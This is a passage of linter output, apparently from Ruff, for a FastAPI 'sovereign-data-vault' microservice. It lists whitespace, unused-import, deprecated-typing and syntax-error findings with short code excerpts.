141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\sovereign-data-vault\app\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\sovereign-data-vault\app\models.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\sovereign-data-vault\app\models.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID, uuid4
  |

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\models.py:6:37
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional
  |                                     ^^^^^^^^
7 | from uuid import UUID, uuid4
  |
help: Remove unused import: `typing.Optional`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\models.py:20:26
   |
18 |     owner_id: str
19 |     encrypted_blob: str  # Base64 encrypted payload
20 |     encryption_metadata: Dict[str, Any]  # Algorithm, Salt, IV
   |                          ^^^^
21 |     access_control_list: List[str]  # List of authorized public keys
22 |     integrity_hash: str  # SHA256 of original data
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\models.py:21:26
   |
19 |     encrypted_blob: str  # Base64 encrypted payload
20 |     encryption_metadata: Dict[str, Any]  # Algorithm, Salt, IV
21 |     access_control_list: List[str]  # List of authorized public keys
   |                          ^^^^
22 |     integrity_hash: str  # SHA256 of original data
23 |     tags: List[str] = []
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\models.py:23:11
   |
21 |     access_control_list: List[str]  # List of authorized public keys
22 |     integrity_hash: str  # SHA256 of original data
23 |     tags: List[str] = []
   |           ^^^^
24 |     created_at: datetime = Field(default_factory=datetime.now)
25 |     updated_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\models.py:31:26
   |
29 |     owner_id: str
30 |     encrypted_blob: str
31 |     encryption_metadata: Dict[str, Any]
   |                          ^^^^
32 |     integrity_hash: str
33 |     tags: List[str] = []
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\models.py:33:11
   |
31 |     encryption_metadata: Dict[str, Any]
32 |     integrity_hash: str
33 |     tags: List[str] = []
   |           ^^^^
   |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\repository.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import: `datetime.datetime`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\sovereign-data-vault\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\sovereign-data-vault\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\sovereign-data-vault\app\repository.py:6:1
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\repository.py:6:47
  |
5 | from datetime import datetime
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
7 | from uuid import UUID
  |
help: Remove unused import: `typing.Tuple`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\repository.py:15:20
   |
13 | class Database:
14 |     def __init__(self):
15 |         self.data: Dict[str, Any] = {"vault": {}}
   |                    ^^^^
16 |         self.connected = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\sovereign-data-vault\app\repository.py:30:52
   |
28 |         self.db = database
29 |
30 |     async def get_object(self, object_id: UUID) -> Optional[VaultObject]:
   |                                                    ^^^^^^^^^^^^^^^^^^^^^
31 |         return self.db.data["vault"].get(str(object_id))
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\repository.py:37:62
   |
35 |         return obj
36 |
37 |     async def list_objects_for_owner(self, owner_id: str) -> List[VaultObject]:
   |                                                              ^^^^
38 |         return [o for o in self.db.data["vault"].values() if o.owner_id == owner_id]
   |
help: Replace with `list`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\sovereign-data-vault\app\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `fastapi.Query` imported but unused
  --> emergent-microservices\sovereign-data-vault\app\routes.py:8:53
   |
 6 | from uuid import UUID
 7 |
 8 | from fastapi import APIRouter, Body, Depends, Path, Query, status
   |                                                     ^^^^^
 9 |
10 | from .logging_config import logger
   |
help: Remove unused import: `fastapi.Query`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> emergent-microservices\sovereign-data-vault\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> emergent-microservices\sovereign-data-vault\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\sovereign-data-vault\app\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\sovereign-data-vault\app\security.py:49:37
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\security.py:49:46
   |
49 | def verify_jwt_token(token: str) -> Optional[Dict[str, Any]]:
   |                                              ^^^^
50 |     """Verify JWT token and return payload"""
51 |     try:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> emergent-microservices\sovereign-data-vault\app\security.py:103:19
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                   ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> emergent-microservices\sovereign-data-vault\app\security.py:103:29
    |
102 | # Role -> Permissions mapping
103 | ROLE_PERMISSIONS: Dict[str, List[str]] = {
    |                             ^^^^
104 |     Role.VIEWER: [Permission.READ],
105 |     Role.EDITOR: [Permission.READ, Permission.WRITE],
    |
help: Replace with `list`

F401 [*] `datetime.datetime` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\services.py:5:22
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                      ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `datetime.timezone` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\services.py:5:32
  |
3 | """
4 |
5 | from datetime import datetime, timezone
  |                                ^^^^^^^^
6 | from typing import Any, Dict, List, Optional, Tuple
7 | from uuid import UUID
  |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\sovereign-data-vault\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\sovereign-data-vault\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\sovereign-data-vault\app\services.py:6:1
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
7 | from uuid import UUID
  |

F401 [*] `typing.Any` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\services.py:6:20
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                    ^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\services.py:6:25
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                         ^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Optional` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\services.py:6:37
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                     ^^^^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\sovereign-data-vault\app\services.py:6:47
  |
5 | from datetime import datetime, timezone
6 | from typing import Any, Dict, List, Optional, Tuple
  |                                               ^^^^^
7 | from uuid import UUID
  |
help: Remove unused import

F401 [*] `.models.VaultAccessRequest` imported but unused
  --> emergent-microservices\sovereign-data-vault\app\services.py:10:21
   |
 9 | from .logging_config import logger
10 | from .models import VaultAccessRequest, VaultObject, VaultUpload
   |                     ^^^^^^^^^^^^^^^^^^
11 | from .repository import VaultRepository
   |
help: Remove unused import: `.models.VaultAccessRequest`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\sovereign-data-vault\app\services.py:44:50
   |
42 |         return obj
43 |
44 |     async def list_vault(self, owner_id: str) -> List[VaultObject]:
   |                                                  ^^^^
45 |         return await self.repository.list_objects_for_owner(owner_id)
   |
help: Replace with `list`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\sovereign-data-vault\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\sovereign-data-vault\database\scripts\integrity_check.py:7:1
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\sovereign-data-vault\database\scripts\integrity_check.py:7:20
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                    ^^^^
  |
help: Remove unused import

F401 [*] `typing.Tuple` imported but unused
 --> emergent-microservices\sovereign-data-vault\database\scripts\integrity_check.py:7:26
  |
5 | import asyncio
6 | import sys
7 | from typing import List, Tuple
  |                          ^^^^^
  |
help: Remove unused import

F821 Undefined name `check_integrity`
  --> emergent-microservices\sovereign-data-vault\database\scripts\integrity_check.py:13:20
   |
11 |     print("Running database integrity checks...")
12 |
13 |     errors = await check_integrity()
   |                    ^^^^^^^^^^^^^^^
14 |
15 |     if errors:
   |

F821 Undefined name `rollback_migration`
  --> emergent-microservices\sovereign-data-vault\database\scripts\rollback.py:16:21
   |
15 |     version = int(sys.argv[1])
16 |     success = await rollback_migration(version)
   |                     ^^^^^^^^^^^^^^^^^^
17 |     sys.exit(0 if success else 1)
   |

invalid-syntax: missing closing quote in string literal
 --> emergent-microservices\sovereign-data-vault\setup.py:6:17
  |
4 |     name="Sovereign Data Vault Layer",
5 |     version="1.0.0",
6 |     description="Microservices:
  |                 ^^^^^^^^^^^^^^^
7 | Zero-knowledge encryption layer
8 | Capability-based access control
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\sovereign-data-vault\setup.py:7:1
  |
5 |     version="1.0.0",
6 |     description="Microservices:
7 | Zero-knowledge encryption layer
  | ^^^^
8 | Capability-based access control
9 | Time-bound decryption tokens
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\sovereign-data-vault\setup.py:7:16
  |
5 |     version="1.0.0",
6 |     description="Microservices:
7 | Zero-knowledge encryption layer
  |                ^^^^^^^^^^
8 | Capability-based access control
9 | Time-bound decryption tokens
  |

invalid-syntax: Expected `,`, found name
 --> emergent-microservices\sovereign-data-vault\setup.py:7:27
  |
5 |     version="1.0.0",
6 |     description="Microservices:
7 | Zero-knowledge encryption layer
  |                           ^^^^^
8 | Capability-based access control
9 | Time-bound decryption tokens
  |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:8:1
   |
 6 |     description="Microservices:
 7 | Zero-knowledge encryption layer
 8 | Capability-based access control
   | ^^^^^^^^^^
 9 | Time-bound decryption tokens
10 | Audit trail hashing
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:8:18
   |
 6 |     description="Microservices:
 7 | Zero-knowledge encryption layer
 8 | Capability-based access control
   |                  ^^^^^^
 9 | Time-bound decryption tokens
10 | Audit trail hashing
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:8:25
   |
 6 |     description="Microservices:
 7 | Zero-knowledge encryption layer
 8 | Capability-based access control
   |                         ^^^^^^^
 9 | Time-bound decryption tokens
10 | Audit trail hashing
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:9:1
   |
 7 | Zero-knowledge encryption layer
 8 | Capability-based access control
 9 | Time-bound decryption tokens
   | ^^^^
10 | Audit trail hashing
11 | Revocation propagation service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:9:12
   |
 7 | Zero-knowledge encryption layer
 8 | Capability-based access control
 9 | Time-bound decryption tokens
   |            ^^^^^^^^^^
10 | Audit trail hashing
11 | Revocation propagation service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:9:23
   |
 7 | Zero-knowledge encryption layer
 8 | Capability-based access control
 9 | Time-bound decryption tokens
   |                       ^^^^^^
10 | Audit trail hashing
11 | Revocation propagation service
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:10:1
   |
 8 | Capability-based access control
 9 | Time-bound decryption tokens
10 | Audit trail hashing
   | ^^^^^
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:10:7
   |
 8 | Capability-based access control
 9 | Time-bound decryption tokens
10 | Audit trail hashing
   |       ^^^^^
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:10:13
   |
 8 | Capability-based access control
 9 | Time-bound decryption tokens
10 | Audit trail hashing
   |             ^^^^^^^
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:11:1
   |
 9 | Time-bound decryption tokens
10 | Audit trail hashing
11 | Revocation propagation service
   | ^^^^^^^^^^
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
13 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:11:12
   |
 9 | Time-bound decryption tokens
10 | Audit trail hashing
11 | Revocation propagation service
   |            ^^^^^^^^^^^
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
13 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:11:24
   |
 9 | Time-bound decryption tokens
10 | Audit trail hashing
11 | Revocation propagation service
   |                        ^^^^^^^
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
13 |     author="IAmSoThirsty",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:12:1
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   | ^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found `case`
  --> emergent-microservices\sovereign-data-vault\setup.py:12:5
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |     ^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\sovereign-data-vault\setup.py:12:9
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |         ^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Got unexpected token ΓÇ£
  --> emergent-microservices\sovereign-data-vault\setup.py:12:11
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |           ^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\sovereign-data-vault\setup.py:12:12
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |            ^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:12:17
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                 ^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\sovereign-data-vault\setup.py:12:23
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                       ^^^^^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:12:32
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                ^^^^^^^^^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:12:45
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                             ^^^^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:12:53
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                     ^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:12:58
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                          ^^^^^^^^^^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:12:72
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                        ^^^^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\sovereign-data-vault\setup.py:12:72
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                        ^^^^^^^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Got unexpected token ΓÇ¥
  --> emergent-microservices\sovereign-data-vault\setup.py:12:80
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                                ^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found Unknown
  --> emergent-microservices\sovereign-data-vault\setup.py:12:80
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                                ^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\sovereign-data-vault\setup.py:12:81
   |
10 | Audit trail hashing
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
   |                                                                                 ^^
13 |     author="IAmSoThirsty",
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\sovereign-data-vault\setup.py:13:5
   |
11 | Revocation propagation service
12 | Use case: ΓÇ£Your data, provably inaccessible without your cryptographic consent.ΓÇ¥",
13 |     author="IAmSoThirsty",
   |     ^^^^^^
14 |     packages=find_packages(exclude=["tests", "tests.*"]),
15 |     python_requires=">=3.11",
   |

UP035 [*] Import from `collections.abc` instead: `AsyncGenerator`
 --> emergent-microservices\sovereign-data-vault\tests\conftest.py:4:1
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Import from `collections.abc`

F401 [*] `typing.AsyncGenerator` imported but unused
 --> emergent-microservices\sovereign-data-vault\tests\conftest.py:4:20
  |
3 | import asyncio
4 | from typing import AsyncGenerator
  |                    ^^^^^^^^^^^^^^
5 |
6 | import pytest
  |
help: Remove unused import: `typing.AsyncGenerator`

F704 `await` statement outside of a function
  --> emergent-microservices\sovereign-data-vault\tests\conftest.py:30:1
   |
29 | database.data.clear()
30 | await database.disconnect()
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `pytest` imported but unused
 --> emergent-microservices\sovereign-data-vault\tests\test_main.py:3:8
  |
1 | """Test main application"""
2 |
3 | import pytest
  |        ^^^^^^
4 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\sovereign-data-vault\tests\test_routes.py:5:8
  |
3 | from uuid import uuid4
4 |
5 | import pytest
  |        ^^^^^^
6 | from fastapi.testclient import TestClient
  |
help: Remove unused import: `pytest`

F401 [*] `app.main.app` imported but unused
 --> emergent-microservices\sovereign-data-vault\tests\test_routes.py:8:22
  |
6 | from fastapi.testclient import TestClient
7 |
8 | from app.main import app
  |                      ^^^
  |
help: Remove unused import: `app.main.app`

F401 [*] `pytest` imported but unused
 --> emergent-microservices\sovereign-data-vault\tests\test_security.py:3:8
  |
1 | """Test security functions"""
2 |
3 | import pytest
  |        ^^^^^^
4 |
5 | from app.security import (
  |
help: Remove unused import: `pytest`

F401 [*] `app.models.ItemUpdate` imported but unused
 --> emergent-microservices\sovereign-data-vault\tests\test_services.py:8:36
  |
7 | from app.errors import NotFoundError
8 | from app.models import ItemCreate, ItemUpdate
  |                                    ^^^^^^^^^^
9 | from app.services import ItemService
  |
help: Remove unused import: `app.models.ItemUpdate`

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:12:1
   |
10 | class Settings(BaseSettings):
11 |     """Application settings with validation"""
12 |     
   | ^^^^
13 |     # Service Metadata
14 |     SERVICE_NAME: str = "Distributed Reputation & Trust Graph Engine"
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\trust-graph-engine\app\config.py:17:1
   |
15 |     VERSION: str = "1.0.0"
